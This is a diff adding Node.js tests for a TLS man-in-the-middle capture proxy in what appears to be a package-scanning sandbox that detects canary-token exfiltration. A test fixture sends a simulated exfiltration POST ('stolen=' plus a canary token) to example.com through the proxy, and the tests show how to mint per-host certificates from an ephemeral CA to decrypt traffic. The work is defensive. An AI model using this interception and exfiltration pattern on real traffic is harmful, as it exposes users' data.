@@ -13,6 +13,7 @@ const os = require("node:os");
 const path = require("node:path");
 const http = require("node:http");
 const net = require("node:net");
+const tls = require("node:tls");
 const {
   runCanarySandbox,
   seedCanaryFilesystem,
@@ -701,4 +702,93 @@ test("#6 injected-runner canary run does not attempt netns confinement", async (
   // half-engaged netns tier.
   assert.notEqual(result.isolation, "bwrap+netns");
   fs.rmSync(pkgDir, { recursive: true, force: true });
+});
+
+// --- #6 --tls-mitm: per-host leaf certs + unconditional CONNECT egress record ---
+
+const { generateEphemeralCa } = require("../src/sandbox");
+
+// Stand up an ephemeral session CA and a MITM capture proxy in front of it.
+async function startMitmProxy(tokens) {
+  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-mitm-ca-"));
+  const ca = generateEphemeralCa(dir);
+  const proxy = await startCaptureProxy(new Set(tokens), { tlsMitm: true, ca });
+  return { dir, ca, proxy };
+}
+
+// (a) The MITM must mint a per-host leaf whose subjectAltName matches the CONNECT
+// hostname, so a client that VALIDATES certs (Node's default) completes the
+// handshake for an arbitrary host — a one-leaf-for-all-hosts SAN-less cert makes
+// such clients abort with ERR_TLS_CERT_ALTNAME_INVALID and observe nothing. Once
+// the handshake succeeds the decrypted request body is captured and scanned.
+test("#6 --tls-mitm: a validating TLS client completes the handshake for an arbitrary host and its body is captured", async () => {
+  const token = "CANARYtoken0123456789abcdef";
+  const { dir, ca, proxy } = await startMitmProxy([token]);
+  try {
+    await new Promise((resolve, reject) => {
+      const raw = net.connect(proxy.port, "127.0.0.1", () => {
+        raw.write("CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n");
+      });
+      raw.on("error", reject);
+      raw.once("data", (buf) => {
+        assert.match(buf.toString("latin1"), /200 Connection Established/);
+        // rejectUnauthorized:true + ca:[ca.cert] → a genuinely validating client.
+        const t = tls.connect(
+          { socket: raw, servername: "example.com", ca: [ca.cert], rejectUnauthorized: true },
+          () => {
+            assert.equal(t.authorized, true, "client must validate the per-host leaf");
+            t.end(`POST /collect HTTP/1.1\r\nHost: example.com\r\n\r\nstolen=${token}`);
+          }
+        );
+        t.on("data", () => {});
+        t.on("error", reject);
+        t.on("close", resolve);
+      });
+    });
+    const hit = proxy.hits.find((h) => h.host === "example.com:443");
+    assert.ok(hit, `no egress record for the host: ${JSON.stringify(proxy.hits)}`);
+    assert.equal(hit.transport, "https-mitm");
+    assert.ok(hit.bodyBytes > 0, `decrypted body not captured: ${JSON.stringify(hit)}`);
+    assert.ok(hit.tokensSeen.includes(token), `canary token not captured: ${JSON.stringify(hit)}`);
+  } finally {
+    await proxy.close();
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+// (b) A rejected handshake must STILL record the CONNECT host — parity with the
+// non-MITM path, which records the destination unconditionally. Recording only
+// in the TLS 'end' handler would leave an aborted handshake with ZERO egress
+// (strictly worse than not passing --tls-mitm at all).
+test("#6 --tls-mitm: a client that aborts the TLS handshake still leaves an egress record for the host", async () => {
+  const { dir, proxy } = await startMitmProxy([]);
+  try {
+    const raw = net.connect(proxy.port, "127.0.0.1", () => {
+      raw.write("CONNECT aborted.example:443 HTTP/1.1\r\nHost: aborted.example:443\r\n\r\n");
+    });
+    raw.on("error", () => { /* the aborted handshake tears the socket down; ignore */ });
+    // Wait for the proxy's 200, then start a validating handshake with no CA so it
+    // fails. Resolve as soon as the handshake is INITIATED — the egress hit is
+    // recorded server-side at CONNECT time, independent of the handshake outcome,
+    // and a rejected handshake does not reliably emit a client-side error/close on
+    // every platform (Windows in particular), so the test must not wait on those.
+    await new Promise((resolve) => {
+      raw.once("data", () => {
+        const t = tls.connect({ socket: raw, servername: "aborted.example", rejectUnauthorized: true }, () => {});
+        t.on("error", () => { try { t.destroy(); } catch { /* noop */ } });
+        resolve();
+      });
+      setTimeout(resolve, 1000); // never hang if the 200 is slow/absent
+    });
+    // Give the server's connect handler a beat to have recorded the hit.
+    await new Promise((r) => setTimeout(r, 100));
+    const hit = proxy.hits.find((h) => h.host === "aborted.example:443");
+    assert.ok(hit, `rejected handshake recorded no egress: ${JSON.stringify(proxy.hits)}`);
+    assert.equal(hit.transport, "https-mitm");
+    assert.equal(hit.bodyBytes, 0, "no decrypted body should have been captured on an aborted handshake");
+    try { raw.destroy(); } catch { /* noop */ }
+  } finally {
+    await proxy.close();
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
 });
